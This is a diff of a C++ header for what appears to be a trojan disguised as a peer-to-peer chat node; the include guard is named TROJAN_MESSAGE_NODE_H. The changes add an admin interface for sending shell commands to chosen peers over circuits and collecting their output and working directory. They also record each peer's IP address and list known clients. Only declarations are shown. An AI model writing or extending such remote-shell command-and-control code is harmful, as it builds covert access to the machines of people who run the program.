@@ -15,8 +15,8 @@
 
 #include "../../admin/Shell.h"
 constexpr uint32_t attempt_budget = 200;
-constexpr auto expiration_time_sec = std::chrono::seconds(45);
-constexpr auto prune_sec = std::chrono::seconds(10);
+constexpr auto expiration_time_sec = std::chrono::seconds(60);
+constexpr auto prune_sec = std::chrono::seconds(15);
 constexpr auto circuit_init_timeout_sec = std::chrono::seconds(10);
 constexpr auto circuit_dead_sec         = std::chrono::seconds(30);
 constexpr uint32_t MAX_NACK_RETRIES     = 5;
@@ -115,6 +115,7 @@ struct NodeSnapshot
     NodeId daddy;
     std::vector<NodeId> linked_peers;
     std::vector<NodeId> known_peers;
+    std::map<NodeId, std::string> peer_ips;
     std::vector<CircuitInfo> circuits;
 };
 
@@ -125,6 +126,12 @@ struct ChatMessage
     std::string                           text;
     std::chrono::system_clock::time_point when;
     bool                                  conn_req{false};
+};
+
+struct ShellOut {
+    std::string from;
+    std::string out;
+    std::string cwd;
 };
 
 class Node : public std::enable_shared_from_this<Node> {
@@ -154,7 +161,16 @@ public:
 
     std::vector<ChatMessage> take_new_messages();
 
+    //ADMIN
+    std::vector<ShellOut> take_shell_outs();
+    void send_shell_cmd(std::string cmd, NodeId to);
+    void set_shell_out_callback(std::function<void(ShellOut)> cb);
+    std::vector<NodeId> get_known_clients() const;
+    bool has_ready_circuit(const NodeId& dst) const;
+
 private:
+    void reply_chunked(const NodeId& src, std::vector<uint8_t> data, ContentType ct);
+
     void send_text(const udp::endpoint &target, std::string text);
 
     void start_receive();
@@ -372,7 +388,8 @@ private:
     //ADMIN
     Shell shell_;
     std::mutex shell_mutex_;
-    std::vector<json> shell_outs_;
+    std::vector<ShellOut> shell_outs_;
+    std::function<void(ShellOut)> shell_out_cb_;
 };
 
 #endif //TROJAN_MESSAGE_NODE_H
